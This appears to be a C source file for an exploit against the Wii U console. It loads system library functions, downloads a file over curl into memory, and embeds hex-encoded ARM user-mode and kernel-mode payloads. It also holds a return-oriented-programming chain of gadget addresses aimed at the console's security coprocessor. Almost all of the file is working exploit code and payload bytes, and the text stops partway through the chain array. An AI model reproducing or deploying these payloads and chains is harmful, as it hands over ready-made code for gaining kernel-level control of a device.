#include "program.h"
#include <dynamic_libs/curl_functions.h>
#include <curl/curl.h>

uint32_t deviceID = -1;

typedef struct {
    void* (*p_memset)(void * dest, unsigned int value, unsigned int bytes);
    void* (*p_memcpy)(void * dest, void * val, unsigned int size);
    void  (*DCFlushRange)(const void *dest, unsigned int size);
    void  (*ICInvalidateRange)(const void *dest, unsigned size);
    void* (*MEMAllocFromDefaultHeapEx)(unsigned int size, unsigned int align);
    void* (*MEMAllocFromDefaultHeap)(unsigned int size);
    void  (*MEMFreeToDefaultHeap)(void *ptr);
    void (*OSExitThread)(int);
    void (*OSYieldThread)(void);
    void (*OSFatal)(const char *msg);
    void (*OSSleepTicks)(unsigned long long time);
    int  (*OSCreateThread)(void *thread, void *entry, int argc, void *args, unsigned int stack, unsigned int stack_size, int priority, unsigned short attr);
    int  (*OSResumeThread)(void *thread);
    int  (*OSIsThreadTerminated)(void *thread);
    int  (*OSJoinThread)(void *thread,int * returnVal);
} os_function_ptr_t;

typedef struct {
    CURLcode (*n_curl_global_init)(long flags);
    CURL* (*n_curl_easy_init)();
    CURLcode (*n_curl_easy_setopt)(void *cptr, CURLoption, ...);
    CURLcode (*n_curl_easy_perform)(void *cptr);
    void (*n_curl_easy_cleanup)(void *cptr);
    CURLcode (*n_curl_easy_getinfo)(void *cptr, CURLINFO, ...);
    CURL *curl_ptr;
} curl_function_ptr_t;

typedef struct {
    void (*socket_lib_init)();
} nsysnet_function_ptr_t;

void init_os_function_ptr(os_function_ptr_t *ptr) {
    unsigned int coreinit_handle;
    OSDynLoad_Acquire("coreinit.rpl", &coreinit_handle);

    unsigned int *function_pointer;

    OSDynLoad_FindExport(coreinit_handle, 1, "MEMAllocFromDefaultHeapEx", &function_pointer);
    ptr->MEMAllocFromDefaultHeapEx = (void*(*)(unsigned int, unsigned int))*function_pointer;
    OSDynLoad_FindExport(coreinit_handle, 1, "MEMAllocFromDefaultHeap", &function_pointer);
    ptr->MEMAllocFromDefaultHeap = (void*(*)(unsigned int))*function_pointer;
    OSDynLoad_FindExport(coreinit_handle, 1, "MEMFreeToDefaultHeap", &function_pointer);
    ptr->MEMFreeToDefaultHeap = (void (*)(void *))*function_pointer;

    OSDynLoad_FindExport(coreinit_handle, 0, "memset", &ptr->p_memset);
    OSDynLoad_FindExport(coreinit_handle, 0, "memcpy", &ptr->p_memcpy);
    OSDynLoad_FindExport(coreinit_handle, 0, "DCFlushRange", &ptr->DCFlushRange);
    OSDynLoad_FindExport(coreinit_handle, 0, "ICInvalidateRange", &ptr->ICInvalidateRange);
    OSDynLoad_FindExport(coreinit_handle, 0, "OSFatal", &ptr->OSFatal);
    OSDynLoad_FindExport(coreinit_handle, 0, "OSSleepTicks", &ptr->OSSleepTicks);
    OSDynLoad_FindExport(coreinit_handle, 0, "OSCreateThread", &ptr->OSCreateThread);
    OSDynLoad_FindExport(coreinit_handle, 0, "OSResumeThread", &ptr->OSResumeThread);
    OSDynLoad_FindExport(coreinit_handle, 0, "OSIsThreadTerminated", &ptr->OSIsThreadTerminated);
    OSDynLoad_FindExport(coreinit_handle, 0, "OSExitThread", &ptr->OSExitThread);
    OSDynLoad_FindExport(coreinit_handle, 0, "OSJoinThread", &ptr->OSJoinThread);
    OSDynLoad_FindExport(coreinit_handle, 0, "OSYieldThread", &ptr->OSYieldThread);
}

void init_curl_function_ptr(curl_function_ptr_t *ptr) {
    unsigned int nlibcurl_handle;
    OSDynLoad_Acquire("nlibcurl.rpl", &nlibcurl_handle);

    OSDynLoad_FindExport(nlibcurl_handle, 0, "curl_global_init", &ptr->n_curl_global_init);
    OSDynLoad_FindExport(nlibcurl_handle, 0, "curl_easy_init", &ptr->n_curl_easy_init);
    OSDynLoad_FindExport(nlibcurl_handle, 0, "curl_easy_setopt", &ptr->n_curl_easy_setopt);
    OSDynLoad_FindExport(nlibcurl_handle, 0, "curl_easy_perform", &ptr->n_curl_easy_perform);
    OSDynLoad_FindExport(nlibcurl_handle, 0, "curl_easy_getinfo", &ptr->n_curl_easy_getinfo);
    OSDynLoad_FindExport(nlibcurl_handle, 0, "curl_easy_cleanup", &ptr->n_curl_easy_cleanup);
    ptr->curl_ptr = NULL;
}

void init_nsysnet_function_ptr(nsysnet_function_ptr_t *ptr) {
    unsigned int nsysnet_handle;
    OSDynLoad_Acquire("nsysnet.rpl", &nsysnet_handle);

    OSDynLoad_FindExport(nsysnet_handle, 0, "socket_lib_init", &ptr->socket_lib_init);
}

typedef struct {
    void *progressArg;
    unsigned char *buffer;
    unsigned int filesize;
    curl_function_ptr_t curl_functions;
    os_function_ptr_t os_functions;
    nsysnet_function_ptr_t nsysnet_functions;
} curl_private_data_t;

os_function_ptr_t g_os_functions;
curl_function_ptr_t g_curl_functions;
nsysnet_function_ptr_t g_nsysnet_functions;

void *xmemcpy(void *addr, void *val, unsigned int size) {
    char *addrp      = (char*)addr;
    const char *valp = (const char*)val;
    while (size--) {
        *addrp++ = *valp++;
    }
    return addr;
}

// #define EXPORT_DECL(res, func, ...)     res (* func)(__VA_ARGS__) __attribute__((section(".data"))) = 0;

void *xrealloc(void *ptr, size_t size, os_function_ptr_t os_functions) {
    void *newPtr;

    if (!ptr) {
        newPtr = os_functions.MEMAllocFromDefaultHeap(size);
        if (!newPtr) {
            goto error;
        }
    } else {
        newPtr = os_functions.MEMAllocFromDefaultHeap(size);
        if (!newPtr) {
            goto error;
        }

        xmemcpy(newPtr, ptr, size);

        os_functions.MEMFreeToDefaultHeap(ptr);
    }

    return newPtr;
error:
    return NULL;
}

int curlCallback(void *buffer, int size, int nmemb, void *userp) {
    curl_private_data_t *private_data = (curl_private_data_t *)userp;
    int read_len = size * nmemb;

    if(0) {
        // int res = private_data->file->write((unsigned char*)buffer, read_len);
        // private_data->filesize += res;
        // return res;
    } else {
        if(!private_data->buffer) {
            private_data->buffer = (unsigned char*) private_data->os_functions.MEMAllocFromDefaultHeap(read_len);
        } else {
            unsigned char *tmp = (unsigned char*) xrealloc(private_data->buffer, private_data->filesize + read_len, private_data->os_functions);
            if(!tmp) {
                private_data->os_functions.MEMFreeToDefaultHeap(private_data->buffer);
                private_data->buffer = NULL;
            } else {
                private_data->buffer = tmp;
            }
        }

        if(!private_data->buffer) {
            private_data->filesize = 0;
            return -1;
        }

        xmemcpy(private_data->buffer + private_data->filesize, buffer, read_len);
        private_data->filesize += read_len;
        return read_len;
    }
}

int internalGetFile(const char *url, curl_private_data_t *private_data) {
    int result = 0;
    int resp = 404;
    int ret = -1;
    private_data->nsysnet_functions.socket_lib_init();
    private_data->curl_functions.curl_ptr = private_data->curl_functions.n_curl_easy_init();
    if(!private_data->curl_functions.curl_ptr) {
        return 0;
    }

    /*
    std::string prefix = "https";
    if(strncmp(downloadUrl.c_str(), prefix.c_str(), prefix.size()) == 0) {
        ssl_context = NSSLCreateContext(0);
        if(ssl_context < 0) {
            goto exit_error;
        }

        // Add all existing certs
        for(int i = 100; i<106; i++) {
            NSSLAddServerPKI(ssl_context,i);
        }

        for(int i = 1001; i<1034; i++) {
            NSSLAddServerPKI(ssl_context,i);
        }
        n_curl_easy_setopt(curl, CURLOPT_GSSAPI_DELEGATION, ssl_context); // Is CURLOPT_NSSL_CONTEXT on the Wii U
    }
    */

    private_data->curl_functions.n_curl_easy_setopt(private_data->curl_functions.curl_ptr, CURLOPT_URL, url);
    private_data->curl_functions.n_curl_easy_setopt(private_data->curl_functions.curl_ptr, CURLOPT_WRITEFUNCTION, curlCallback);
    private_data->curl_functions.n_curl_easy_setopt(private_data->curl_functions.curl_ptr, CURLOPT_WRITEDATA, private_data);
    private_data->curl_functions.n_curl_easy_setopt(private_data->curl_functions.curl_ptr, CURLOPT_USERAGENT, "r/4.3.2.11274.JP");
    private_data->curl_functions.n_curl_easy_setopt(private_data->curl_functions.curl_ptr, CURLOPT_FOLLOWLOCATION, 1L);

    // n_curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errbuf);

    /*
    if(private_data->progressCallback) {
        n_curl_easy_setopt(curl, CURLOPT_PROGRESSFUNCTION, FileDownloader::curlProgressCallback);
        n_curl_easy_setopt(curl, CURLOPT_PROGRESSDATA, private_data);
        n_curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 0L);
    }
    */

    ret = private_data->curl_functions.n_curl_easy_perform(private_data->curl_functions.curl_ptr);
    if(ret) {
        
    }

    if(!private_data->filesize) {
        
    }

    private_data->curl_functions.n_curl_easy_getinfo(private_data->curl_functions.curl_ptr, CURLINFO_RESPONSE_CODE, &resp);

    if(resp != 200) {
        
    }

    result = 1;

exit_error:
    /*
    if(ssl_context >= 0) {
        NSSLDestroyContext(ssl_context);
    }
    */

    private_data->curl_functions.n_curl_easy_cleanup(private_data->curl_functions.curl_ptr);
    return result;
}

int getFile(const char *url, unsigned char **outBuffer, int *outSize, curl_function_ptr_t curl_functions, os_function_ptr_t os_functions, nsysnet_function_ptr_t nsysnet_functions) {
    curl_private_data_t private_data;
    // private_data.progressCallback = callback;
    private_data.progressArg = 0;
    private_data.buffer = 0;
    private_data.filesize = 0;

    private_data.curl_functions    = curl_functions;
    private_data.os_functions      = os_functions;
    private_data.nsysnet_functions = nsysnet_functions;

    int result = internalGetFile(url, &private_data);

    if(private_data.filesize > 0 && private_data.buffer) {
        unsigned char *buffer = (unsigned char*)os_functions.MEMAllocFromDefaultHeap(private_data.filesize);
        xmemcpy(buffer, private_data.buffer, private_data.filesize);
        *outBuffer = buffer;
        *outSize   = private_data.filesize;
    }

    if(private_data.buffer) {
        os_functions.MEMFreeToDefaultHeap(private_data.buffer);
    }

    return result;
}

static const unsigned char arm_user_bin[] = {
  0xea, 0x00, 0x00, 0x03, 0xe1, 0xa0, 0xf0, 0x00, 0xee, 0x17, 0xff, 0x7a,
  0x1a, 0xff, 0xff, 0xfd, 0xee, 0x07, 0x0f, 0x9a, 0xe5, 0x9f, 0x30, 0x4c,
  0xe3, 0xa0, 0x10, 0x00, 0xe5, 0x93, 0x00, 0x00, 0xe2, 0x83, 0x32, 0x01,
  0xe2, 0x43, 0x3f, 0xbf, 0xe9, 0x2d, 0x40, 0x10, 0xe1, 0x2f, 0xff, 0x33,
  0xe3, 0x50, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x02, 0xe5, 0x9f, 0x30, 0x2c,
  0xe3, 0xa0, 0x00, 0x01, 0xe1, 0x2f, 0xff, 0x33, 0xe5, 0x9f, 0xd0, 0x08,
  0xe5, 0x9f, 0x00, 0x0c, 0xe5, 0x9f, 0xe0, 0x04, 0xe5, 0x9f, 0xf0, 0x08,
  0x10, 0x16, 0xae, 0x30, 0x10, 0x12, 0xea, 0xcc, 0x10, 0x14, 0x60, 0x80,
  0x10, 0x11, 0x11, 0x64, 0xe8, 0xbd, 0x80, 0x10, 0x00, 0x12, 0xf0, 0x00,
  0x10, 0x12, 0xee, 0x4c, 0xe2, 0x40, 0x30, 0x01, 0xe0, 0x81, 0x20, 0x02,
  0xe1, 0x51, 0x00, 0x02, 0x01, 0x2f, 0xff, 0x1e, 0xe4, 0xd1, 0xc0, 0x01,
  0xe5, 0xe3, 0xc0, 0x01, 0xea, 0xff, 0xff, 0xfa, 0xe1, 0xa0, 0x30, 0x00,
  0xe0, 0x80, 0x20, 0x02, 0xe1, 0x53, 0x00, 0x02, 0x01, 0x2f, 0xff, 0x1e,
  0xe4, 0xc3, 0x10, 0x01, 0xea, 0xff, 0xff, 0xfb
};
static const unsigned int arm_user_bin_len = 164;


static const unsigned char arm_kernel_bin[] = {
  0xea, 0x00, 0x00, 0x0d, 0xee, 0x11, 0x0f, 0x10, 0xe3, 0xc0, 0x3a, 0x01,
  0xe3, 0xc3, 0x30, 0x05, 0xee, 0x01, 0x3f, 0x10, 0xe1, 0x2f, 0xff, 0x1e,
  0xee, 0x01, 0x0f, 0x10, 0xe1, 0x2f, 0xff, 0x1e, 0xe3, 0xa0, 0x35, 0x36,
  0xe5, 0x93, 0x10, 0x10, 0xe5, 0x93, 0x20, 0x10, 0xe0, 0x42, 0x20, 0x01,
  0xe3, 0x52, 0x00, 0x08, 0x9a, 0xff, 0xff, 0xfb, 0xe1, 0x2f, 0xff, 0x1e,
  0xe9, 0x2d, 0x47, 0xf0, 0xe5, 0x9f, 0x11, 0xa8, 0xe5, 0x9f, 0x01, 0xa8,
  0xe5, 0x9f, 0x31, 0xa8, 0xe1, 0x2f, 0xff, 0x33, 0xe5, 0x9f, 0x31, 0xa4,
  0xe1, 0x2f, 0xff, 0x33, 0xe5, 0x9f, 0x41, 0xa0, 0xe3, 0xa0, 0x90, 0x00,
  0xe1, 0xa0, 0x60, 0x00, 0xeb, 0xff, 0xff, 0xe6, 0xe5, 0x9f, 0x31, 0x94,
  0xe5, 0x9f, 0x11, 0x94, 0xe5, 0x93, 0x2d, 0x18, 0xe5, 0x9f, 0x31, 0x90,
  0xe5, 0x83, 0x20, 0x00, 0xe5, 0x9f, 0x31, 0x8c, 0xe5, 0x9f, 0x21, 0x8c,
  0xe5, 0x83, 0x2a, 0x24, 0xe3, 0xa0, 0x20, 0x30, 0xe1, 0xa0, 0x70, 0x00,
  0xe5, 0x9f, 0x01, 0x80, 0xe1, 0x2f, 0xff, 0x34, 0xe5, 0x9f, 0x11, 0x7c,
  0xe3, 0xa0, 0x20, 0x68, 0xe5, 0x9f, 0x01, 0x78, 0xe1, 0x2f, 0xff, 0x34,
  0xe5, 0x9f, 0x11, 0x74, 0xe3, 0xa0, 0x20, 0x68, 0xe5, 0x9f, 0x01, 0x70,
  0xe1, 0x2f, 0xff, 0x34, 0xe3, 0xa0, 0x20, 0xa4, 0xe3, 0xa0, 0x19, 0x52,
  0xe5, 0x9f, 0x01, 0x64, 0xe1, 0x2f, 0xff, 0x34, 0xe3, 0xa0, 0x45, 0x36,
  0xe5, 0x94, 0x30, 0xe0, 0xe3, 0xc3, 0x3b, 0x02, 0xe5, 0x84, 0x30, 0xe0,
  0xe5, 0x94, 0x30, 0xe0, 0xe3, 0xc3, 0x3b, 0x01, 0xe5, 0x84, 0x30, 0xe0,
  0xeb, 0xff, 0xff, 0xcd, 0xe3, 0xa0, 0x00, 0x01, 0xe5, 0x94, 0x30, 0xe0,
  0xe3, 0x89, 0x8c, 0x06, 0xe3, 0x83, 0x3b, 0x01, 0xe3, 0xa0, 0x50, 0x0b,
  0xe5, 0x84, 0x30, 0xe0, 0xe2, 0x55, 0x50, 0x01, 0x2a, 0x00, 0x00, 0x1d,
  0xe3, 0xa0, 0x80, 0x11, 0xe3, 0xa0, 0x20, 0x00, 0xe2, 0x58, 0x80, 0x01,
  0x1a, 0x00, 0x00, 0x28, 0xe1, 0xa0, 0x30, 0x89, 0xe2, 0x83, 0x37, 0x7f,
  0xe2, 0x83, 0x3b, 0xff, 0xe1, 0xc3, 0x20, 0xb0, 0xe5, 0x94, 0x30, 0xe0,
  0xe2, 0x89, 0x90, 0x01, 0xe3, 0xc3, 0x3b, 0x01, 0xe5, 0x84, 0x30, 0xe0,
  0xeb, 0xff, 0xff, 0xb8, 0xe3, 0x59, 0x0c, 0x01, 0x1a, 0xff, 0xff, 0xe9,
  0xe5, 0x9f, 0x30, 0xe4, 0xe1, 0xa0, 0x00, 0x07, 0xe5, 0x83, 0x85, 0x00,
  0xeb, 0xff, 0xff, 0xb0, 0xe5, 0x9f, 0x10, 0x94, 0xe5, 0x9f, 0x00, 0xb8,
  0xe5, 0x9f, 0x30, 0xd0, 0xe1, 0x2f, 0xff, 0x33, 0xe5, 0x9f, 0x30, 0xcc,
  0xe1, 0x2f, 0xff, 0x33, 0xe5, 0x9f, 0x30, 0xc8, 0xe1, 0xa0, 0x00, 0x06,
  0xe1, 0x2f, 0xff, 0x33, 0xe1, 0xa0, 0x00, 0x08, 0xe8, 0xbd, 0x87, 0xf0,
  0xe0, 0x18, 0x35, 0x10, 0xe5, 0x94, 0x30, 0xe0, 0x13, 0x83, 0x3a, 0x01,
  0x03, 0xc3, 0x3a, 0x01, 0xe5, 0x84, 0x30, 0xe0, 0xeb, 0xff, 0xff, 0xa1,
  0xe5, 0x94, 0x30, 0xe0, 0xe3, 0x83, 0x3b, 0x02, 0xe5, 0x84, 0x30, 0xe0,
  0xeb, 0xff, 0xff, 0x9d, 0xe5, 0x94, 0x30, 0xe0, 0xe3, 0xc3, 0x3b, 0x02,
  0xe5, 0x84, 0x30, 0xe0, 0xeb, 0xff, 0xff, 0x99, 0xea, 0xff, 0xff, 0xd0,
  0xe5, 0x94, 0x30, 0xe0, 0xe1, 0xa0, 0x50, 0x82, 0xe3, 0x83, 0x3b, 0x02,
  0xe5, 0x84, 0x30, 0xe0, 0xeb, 0xff, 0xff, 0x93, 0xe5, 0x94, 0x30, 0xe0,
  0xe3, 0xc3, 0x3b, 0x02, 0xe5, 0x84, 0x30, 0xe0, 0xeb, 0xff, 0xff, 0x8f,
  0xe5, 0x94, 0x20, 0xe8, 0xe1, 0xa0, 0x29, 0x02, 0xe1, 0x85, 0x2f, 0xa2,
  0xea, 0xff, 0xff, 0xc7, 0x00, 0x00, 0x40, 0x01, 0x08, 0x12, 0x00, 0xf0,
  0x08, 0x12, 0x01, 0x60, 0x08, 0x12, 0xe7, 0x78, 0x08, 0x13, 0x1d, 0x04,
  0x10, 0x16, 0xa0, 0x00, 0x08, 0x13, 0x43, 0x74, 0x00, 0x12, 0xf0, 0x00,
  0x08, 0x12, 0x90, 0x00, 0xe1, 0x2f, 0xff, 0x1e, 0x08, 0x12, 0x98, 0xbc,
  0x08, 0x13, 0x43, 0xa4, 0x08, 0x12, 0x96, 0xe4, 0x08, 0x13, 0x44, 0x0c,
  0x10, 0x10, 0x01, 0x74, 0x10, 0x13, 0x12, 0xd0, 0x01, 0x55, 0x50, 0x00,
  0x08, 0x12, 0x01, 0x64, 0x08, 0x12, 0xdc, 0xf0, 0x08, 0x12, 0xe7, 0x8c,
  0xe2, 0x40, 0x30, 0x01, 0xe0, 0x81, 0x20, 0x02, 0xe1, 0x51, 0x00, 0x02,
  0x01, 0x2f, 0xff, 0x1e, 0xe4, 0xd1, 0xc0, 0x01, 0xe5, 0xe3, 0xc0, 0x01,
  0xea, 0xff, 0xff, 0xfa, 0xe1, 0xa0, 0x30, 0x00, 0xe0, 0x80, 0x20, 0x02,
  0xe1, 0x53, 0x00, 0x02, 0x01, 0x2f, 0xff, 0x1e, 0xe4, 0xc3, 0x10, 0x01,
  0xea, 0xff, 0xff, 0xfb, 0xe1, 0x2f, 0xff, 0x1e, 0xe9, 0x2d, 0x40, 0x30,
  0xe5, 0x93, 0x20, 0x00, 0xe1, 0xa0, 0x40, 0x00, 0xe5, 0x92, 0x30, 0x54,
  0xe1, 0xa0, 0x50, 0x01, 0xe3, 0x53, 0x00, 0x01, 0x0a, 0x00, 0x00, 0x02,
  0xe1, 0x53, 0x00, 0x00, 0xe3, 0xe0, 0x00, 0x00, 0x18, 0xbd, 0x80, 0x30,
  0xe3, 0x54, 0x00, 0x0d, 0x08, 0x16, 0x6c, 0x00, 0x00, 0x00, 0x18, 0x0c,
  0x08, 0x14, 0x40, 0x00, 0x00, 0x00, 0x9d, 0x70, 0x08, 0x16, 0x84, 0x0c,
  0x00, 0x00, 0xb4, 0x0c, 0x00, 0x00, 0x01, 0x01, 0x08, 0x14, 0x40, 0x00,
  0x08, 0x15, 0x00, 0x00, 0x08, 0x17, 0x21, 0x80, 0x08, 0x17, 0x38, 0x00,
  0x08, 0x14, 0x30, 0xd4, 0x08, 0x14, 0x12, 0x50, 0x08, 0x14, 0x12, 0x94,
  0xe3, 0xa0, 0x35, 0x36, 0xe5, 0x93, 0x21, 0x94, 0xe3, 0xc2, 0x2e, 0x21,
  0xe5, 0x83, 0x21, 0x94, 0xe5, 0x93, 0x11, 0x94, 0xe1, 0x2f, 0xff, 0x1e,
  0xe5, 0x9f, 0x30, 0x1c, 0xe5, 0x9f, 0xc0, 0x1c, 0xe5, 0x93, 0x20, 0x00,
  0xe1, 0xa0, 0x10, 0x00, 0xe5, 0x92, 0x30, 0x54, 0xe5, 0x9c, 0x00, 0x00,
  0xe5, 0x8d, 0xe0, 0x04, 0xe5, 0x8d, 0xc0, 0x08, 0xe5, 0x8d, 0x40, 0x0c,
  0xe5, 0x8d, 0x60, 0x10, 0xeb, 0x00, 0xb2, 0xfd, 0xea, 0xff, 0xff, 0xc9,
  0x10, 0x14, 0x03, 0xf8, 0x10, 0x62, 0x4d, 0xd3, 0x10, 0x14, 0x50, 0x00,
  0x10, 0x14, 0x50, 0x20, 0x10, 0x14, 0x00, 0x00, 0x10, 0x14, 0x00, 0x90,
  0x10, 0x14, 0x00, 0x70, 0x10, 0x14, 0x00, 0x98, 0x10, 0x14, 0x00, 0x84,
  0x10, 0x14, 0x03, 0xe8, 0x10, 0x14, 0x00, 0x3c, 0x00, 0x00, 0x01, 0x73,
  0x00, 0x00, 0x01, 0x76, 0xe9, 0x2d, 0x4f, 0xf0, 0xe2, 0x4d, 0xde, 0x17,
  0xeb, 0x00, 0xb9, 0x92, 0xe3, 0xa0, 0x10, 0x00, 0xe3, 0xa0, 0x20, 0x03,
  0xe5, 0x9f, 0x0e, 0x68, 0xeb, 0x00, 0xb3, 0x20
};
static const unsigned int arm_kernel_bin_len = 884;


static const unsigned char final_chain_bin[] = {
  0x10, 0x12, 0x36, 0xf3, 0x00, 0x00, 0x00, 0x00, 0x08, 0x12, 0x97, 0x4c,
  0x00, 0x00, 0x00, 0x68, 0x10, 0x10, 0x16, 0x38, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x10, 0x38, 0x8c,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0xcf, 0xec,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0xea, 0xbc,
  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x10, 0x12, 0x3a, 0x9f,
  0x08, 0x12, 0x98, 0xbc, 0xe9, 0x2d, 0x40, 0x10, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x12, 0x3a, 0x8b, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x10, 0xcd, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x12, 0xee, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x12, 0x3a, 0x9f, 0x08, 0x12, 0x98, 0xc0, 0xe1, 0xa0, 0x40, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0x3a, 0x8b, 0x00, 0x00, 0x00, 0x01,
  0x00, 0x00, 0x00, 0x00, 0x10, 0x10, 0xcd, 0x18, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0xee, 0x64, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0x3a, 0x9f, 0x08, 0x12, 0x98, 0xc4,
  0xe3, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0x3a, 0x8b,
  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10, 0x10, 0xcd, 0x18,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0xee, 0x64,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0x3a, 0x9f,
  0x08, 0x12, 0x98, 0xc8, 0xee, 0x03, 0x0f, 0x10, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x12, 0x3a, 0x8b, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x10, 0xcd, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x12, 0xee, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x12, 0x3a, 0x9f, 0x08, 0x12, 0x98, 0xcc, 0xe1, 0xa0, 0x00, 0x04,
  0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0x3a, 0x8b, 0x00, 0x00, 0x00, 0x01,
  0x00, 0x00, 0x00, 0x00, 0x10, 0x10, 0xcd, 0x18, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0xee, 0x64, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0x3a, 0x9f, 0x08, 0x12, 0x98, 0xd0,
  0xe1, 0x2f, 0xff, 0x33, 0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0x3a, 0x8b,
  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10, 0x10, 0xcd, 0x18,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0xee, 0x64,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0x3a, 0x9f,
  0x08, 0x12, 0x98, 0xd4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x12, 0x3a, 0x8b, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x10, 0xcd, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x12, 0xee, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x12, 0x3a, 0x9f, 0x08, 0x12, 0x98, 0xd8, 0xee, 0x17, 0xff, 0x7a,
  0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0x3a, 0x8b, 0x00, 0x00, 0x00, 0x01,
  0x00, 0x00, 0x00, 0x00, 0x10, 0x10, 0xcd, 0x18, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0xee, 0x64, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0x3a, 0x9f, 0x08, 0x12, 0x98, 0xdc,
  0x1a, 0xff, 0xff, 0xfd, 0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0x3a, 0x8b,
  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10, 0x10, 0xcd, 0x18,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0xee, 0x64,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0x3a, 0x9f,
  0x08, 0x12, 0x98, 0xe0, 0xee, 0x07, 0x0f, 0x9a, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x12, 0x3a, 0x8b, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x10, 0xcd, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x12, 0xee, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x12, 0x3a, 0x9f, 0x08, 0x12, 0x98, 0xe4, 0xe1, 0xa0, 0x30, 0x04,
  0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0x3a, 0x8b, 0x00, 0x00, 0x00, 0x01,
  0x00, 0x00, 0x00, 0x00, 0x10, 0x10, 0xcd, 0x18, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0xee, 0x64, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0x3a, 0x9f, 0x08, 0x12, 0x98, 0xe8,
  0xe8, 0xbd, 0x40, 0x10, 0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0x3a, 0x8b,
  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10, 0x10, 0xcd, 0x18,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0xee, 0x64,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0x3a, 0x9f,
  0x08, 0x12, 0x98, 0xec, 0xe1, 0x2f, 0xff, 0x13, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x12, 0x3a, 0x8b, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x10, 0xcd, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x12, 0xee, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x12, 0x3a, 0x9f, 0x08, 0x12, 0x98, 0xbc, 0x00, 0x00, 0x40, 0x01,
  0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0xed, 0x4c, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x10, 0x12, 0x3a, 0x9f, 0x08, 0x13, 0x41, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x10, 0x63, 0xdb,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x74, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x12, 0x39, 0x83, 0x00, 0x14, 0x00, 0x00, 0x08, 0x13, 0x1d, 0x04,
